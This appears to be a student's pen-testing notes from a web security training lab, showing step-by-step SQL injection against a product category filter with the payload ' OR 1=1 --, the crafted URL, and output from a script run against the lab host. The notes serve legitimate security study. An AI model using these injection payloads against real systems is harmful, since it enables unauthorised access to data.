@@ -1,0 +1,37 @@
+======================================================================
+Pen testing notes for the lab
+
+SQL injection - product category filter.
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End goal: display all products (both released and unreleased).
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Pets' AND released = 1 // valid
+
+SELECT * FROM products WHERE category = ''' AND released = 1 // internal server error
+
+SELECT * FROM products WHERE category = ''--' AND released = 1 // valid
+
+SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1 // get all categories
+
+web-security-academy.net/filter?category=' OR 1=1 --
+
+======================================================================
+Python script outputs
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-01]
+└─$ python3 sqli-lab-01.py https://0aff0041033b0d2e80004edc00c100fb.web-security-academy.net "' OR 1=1--"
+[+] SQL injection successful!
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-01]
+└─$ python3 sqli-lab-01.py https://0aff0041033b0d2e80004edc00c100fb.web-security-academy.net "'"         
+[-] SQL injection failed!
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-01]
+└─$ python3 sqli-lab-01.py                                                                               
+[-] Usage: sqli-lab-01.py <url> <payload>
+[-] Example: sqli-lab-01.py www.example.com "1=1"
+
